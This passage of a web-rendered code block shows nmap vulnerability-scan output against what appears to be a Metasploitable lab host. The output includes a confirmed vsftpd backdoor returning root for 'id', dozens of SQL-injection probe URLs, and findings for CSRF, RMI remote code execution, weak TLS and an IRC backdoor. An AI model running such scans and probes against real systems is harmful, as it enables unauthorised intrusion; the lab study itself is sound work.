class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/桌面]</span><br><span class="line">└─# nmap --script=vuln 192.168.111.136</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-11 08:46 EDT</span><br><span class="line">Host is up (0.0031s latency).</span><br><span class="line">Not shown: 977 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">| ftp-vsftpd-backdoor: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   vsFTPd version 2.3.4 backdoor</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2011-2523  BID:48539</span><br><span class="line">|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.</span><br><span class="line">|     Disclosure date: 2011-07-03</span><br><span class="line">|     Exploit results:</span><br><span class="line">|       Shell command: id</span><br><span class="line">|       Results: uid=0(root) gid=0(root)</span><br><span class="line">|     References:</span><br><span class="line">|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb</span><br><span class="line">|       https://www.securityfocus.com/bid/48539</span><br><span class="line">|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">23/tcp   open  telnet</span><br><span class="line">25/tcp   open  smtp</span><br><span class="line">| smtp-vuln-cve2010-4344: </span><br><span class="line">|_  The SMTP server is not Exim: NOT VULNERABLE</span><br><span class="line">|_sslv2-drown: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="line">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="line">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       which could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix builtin</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|   </span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2015-4000  BID:74733</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit export-grade</span><br><span class="line">|       cryptography, which is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily break the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure date: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix builtin</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">80/tcp   open  http</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=password-generator.php%27%20OR%20sqlspider&amp;username=anonymous</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=usage-instructions.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=user-info.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=pen-test-tool-lookup.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=browser-info.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=documentation%2Fhow-to-access-Mutillidae-over-Virtual-Box-network.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=home.php&amp;do=toggle-security%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=login.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=captured-data.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=home.php&amp;do=toggle-hints%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=dns-lookup.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=site-footer-xss-discussion.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/?page=add-to-your-blog.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=framing.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=capture-data.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=secret-administrative-pages.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=set-background-color.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=notes.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/?page=login.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=php-errors.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=documentation%2Fvulnerabilities.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=show-log.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=change-log.htm%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=add-to-your-blog.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=installation.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/?page=source-viewer.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/?page=credits.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=arbitrary-file-inclusion.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/?page=user-info.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=register.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=view-someones-blog.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=source-viewer.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/?page=text-file-viewer.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=user-poll.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=home.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=html5-storage.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=credits.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/?page=show-log.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/index.php?page=text-file-viewer.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/mutillidae/?page=view-someones-blog.php%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8%27%20OR%20sqlspider&amp;rev2=1.7</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8&amp;rev2=1.7%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10%27%20OR%20sqlspider&amp;rev2=1.9</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10&amp;rev2=1.9%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9%27%20OR%20sqlspider&amp;rev2=1.8</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9&amp;rev2=1.8%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.9%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10%27%20OR%20sqlspider&amp;template=oopsrev</span><br><span class="line">|     http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10&amp;template=oopsrev%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.8%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.7%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10%27%20OR%20sqlspider&amp;rev2=1.9</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10&amp;rev2=1.9%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10%27%20OR%20sqlspider&amp;template=oopsrev</span><br><span class="line">|     http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10&amp;template=oopsrev%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9%27%20OR%20sqlspider&amp;rev2=1.8</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9&amp;rev2=1.8%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.7%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.9%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8%27%20OR%20sqlspider&amp;rev2=1.7</span><br><span class="line">|     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8&amp;rev2=1.7%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.8%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=S%3BO%3DD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=M%3BO%3DD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=D%3BO%3DD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.111.136:80/dav/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.111.136:80/dav/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-fileupload-exploiter: </span><br><span class="line">|   </span><br><span class="line">|_    Couldn&#x27;t find a file-type field.</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.111.136</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.111.136:80/dvwa/</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: login.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.111.136:80/dvwa/login.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: login.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://TWiki.org/cgi-bin/passwd/TWiki/WebHome</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://TWiki.org/cgi-bin/passwd/Main/WebHome</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://TWiki.org/cgi-bin/edit/TWiki/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://TWiki.org/cgi-bin/view/TWiki/TWikiSkins</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html</span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: http://TWiki.org/cgi-bin/manage/TWiki/ManagingWebs</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /tikiwiki/: Tikiwiki</span><br><span class="line">|   /test/: Test page</span><br><span class="line">|   /phpinfo.php: Possible information file</span><br><span class="line">|   /phpMyAdmin/: phpMyAdmin</span><br><span class="line">|   /doc/: Potentially interesting directory w/ listing on &#x27;apache/2.2.8 (ubuntu) dav/2&#x27;</span><br><span class="line">|   /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">|_  /index/: Potentially interesting folder</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">512/tcp  open  exec</span><br><span class="line">513/tcp  open  login</span><br><span class="line">514/tcp  open  shell</span><br><span class="line">1099/tcp open  rmiregistry</span><br><span class="line">| rmi-vuln-classloader: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   RMI registry default configuration remote code execution vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.</span><br><span class="line">|       </span><br><span class="line">|     References:</span><br><span class="line">|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb</span><br><span class="line">1524/tcp open  ingreslock</span><br><span class="line">2049/tcp open  nfs</span><br><span class="line">2121/tcp open  ccproxy-ftp</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">5432/tcp open  postgresql</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="line">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="line">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">| ssl-ccs-injection: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: High</span><br><span class="line">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="line">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="line">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="line">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="line">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="line">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="line">|           </span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="line">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="line">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="line">5900/tcp open  vnc</span><br><span class="line">6000/tcp open  X11</span><br><span class="line">6667/tcp open  irc</span><br><span class="line">|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277</span><br><span 